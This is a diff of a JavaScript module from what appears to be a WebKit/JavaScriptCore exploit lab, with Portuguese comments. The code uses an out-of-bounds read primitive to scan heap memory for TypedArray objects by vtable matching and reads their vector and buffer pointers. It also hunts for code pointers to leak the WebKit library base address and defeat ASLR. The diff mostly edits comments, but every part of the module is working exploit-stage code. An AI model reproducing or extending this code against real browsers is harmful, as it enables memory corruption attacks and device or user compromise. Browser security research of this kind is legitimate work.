@@ -1,6 +1,5 @@
 // js/victim_finder.mjs
-// Importa a classe E a função de verificação de int64.mjs
-import { AdvancedInt64, isAdvancedInt64Object } from './int64.mjs';
+import { AdvancedInt64, isAdvancedInt64Object } from './int64.mjs'; // Importa a classe E a função de verificação
 import { log as appLog, PAUSE_LAB, toHexS1 } from './utils.mjs';
 import * as Core from './core_exploit.mjs';
 import { JSC_OFFSETS, OOB_CONFIG, WEBKIT_LIBRARY_INFO, updateOOBConfigFromUI } from './config.mjs';
@@ -25,7 +24,7 @@ export function setLeakedWebKitBaseAddress(baseAddrHex) {
         return;
     }
     try {
-        leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex); // Usa o construtor de AdvancedInt64
+        leakedWebKitBaseAddress = new AdvancedInt64(baseAddrHex);
         appLog(`Endereço base da WebKit definido para: ${leakedWebKitBaseAddress.toString(true)}`, "good", FNAME_SET_BASE);
         
         KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES = (WEBKIT_LIBRARY_INFO.KNOWN_OFFSETS.VTable_Possible_Offsets || []).map(offsetHex =>
@@ -43,19 +42,18 @@ export function setLeakedWebKitBaseAddress(baseAddrHex) {
     }
 }
 
-
 async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
     let vtable_ptr, m_mode_val, m_length_val, m_vector_ptr, m_buffer_ptr;
 
     try {
         const vtableReadOffset = currentCandidateBaseRelOffset + (JSC_OFFSETS.TypedArray.VTABLE_OFFSET || 0);
         vtable_ptr = Core.oob_read_relative(vtableReadOffset, 8);
-        // Log de depuração já está em Core.oob_read_relative
+        // O log de depuração para vtable_ptr já está em Core.oob_read_relative
 
         let vtableMatch = false;
         if (leakedWebKitBaseAddress && KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES.length > 0 && isAdvancedInt64Object(vtable_ptr)) {
             for (const knownVTableAddr of KNOWN_TYPED_ARRAY_VTABLE_ABSOLUTE_ADDRESSES) {
-                if (vtable_ptr.equals(knownVTableAddr)) {
+                if (vtable_ptr.equals(knownVTableAddr)) { 
                     vtableMatch = true;
                     break;
                 }
@@ -70,12 +68,11 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
 
         const vectorReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.M_VECTOR_OFFSET;
         m_vector_ptr = Core.oob_read_relative(vectorReadOffset, 8);
-        // Log de depuração já está em Core.oob_read_relative
+        // O log de depuração para m_vector_ptr já está em Core.oob_read_relative
 
         const typeName = TYPED_ARRAY_MODES[m_mode_val] || null;
         const isLengthPlausible = typeof m_length_val === 'number' && m_length_val > 0 && m_length_val < (1024 * 1024 * 32);
         
-        // Usa a função importada isAdvancedInt64Object
         const isVectorPlausible = isAdvancedInt64Object(m_vector_ptr) && 
                                   !m_vector_ptr.isNullPtr() && 
                                   !m_vector_ptr.isNegativeOne() && 
@@ -84,7 +81,7 @@ async function scanForTypedArrays(currentCandidateBaseRelOffset, logFn) {
         if (typeName && isLengthPlausible && isVectorPlausible) {
             const bufferPtrReadOffset = currentCandidateBaseRelOffset + JSC_OFFSETS.TypedArray.ASSOCIATED_ARRAYBUFFER_OFFSET;
             m_buffer_ptr = Core.oob_read_relative(bufferPtrReadOffset, 8);
-            // Log de depuração já está em Core.oob_read_relative
+            // O log de depuração para m_buffer_ptr já está em Core.oob_read_relative
 
             const isBufferPtrPlausible = isAdvancedInt64Object(m_buffer_ptr) &&
                                          !m_buffer_ptr.isNullPtr() &&
@@ -116,11 +113,10 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
     let potentialPtr;
     try {
         potentialPtr = Core.oob_read_relative(currentCandidateBaseRelOffset, 8);
-        // Log de depuração já está em Core.oob_read_relative
+        // O log de depuração para potentialPtr já está em Core.oob_read_relative
 
         if (isAdvancedInt64Object(potentialPtr) && !potentialPtr.isNullPtr() && !potentialPtr.isNegativeOne()) {
-            // ... (lógica de verificação de ponteiro de código como antes) ...
-             if (leakedWebKitBaseAddress) {
+            if (leakedWebKitBaseAddress) {
                 for (const segment of WEBKIT_LIBRARY_INFO.SEGMENTS) {
                     const segStart = leakedWebKitBaseAddress.add(AdvancedInt64.fromHex(segment.vaddr_start_hex));
                     const segEnd = segStart.add(AdvancedInt64.fromHex(segment.memsz_hex));
@@ -142,7 +138,7 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
                         };
                     }
                 }
-            } else { // Base da lib não conhecida, tenta calcular
+            } else {
                 for (const [funcName, funcOffsetHex] of Object.entries(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS)) {
                     const funcOffsetInt64 = AdvancedInt64.fromHex(funcOffsetHex);
                     const potentialBaseAddr = potentialPtr.sub(funcOffsetInt64);
@@ -164,8 +160,6 @@ async function scanForCodePointers(currentCandidateBaseRelOffset, logFn) {
     return null;
 }
 
-// scanMemory e findVictimButtonHandler permanecem como na versão anterior (v3.6.0 - esta seria a v3.7.0),
-// pois as correções são focadas nas sub-funções de scan e na importação/verificação em int64.mjs.
 export async function scanMemory(scanStartRelOffset, scanRangeBytes, stepBytes = 8, scanConfig = {typedArrays: true, codePointers: false}) {
     const FNAME_SCAN = `${FNAME_BASE}.scanMemory`;
     appLog(`--- Iniciando ${FNAME_SCAN} ---`, 'test', FNAME_SCAN);
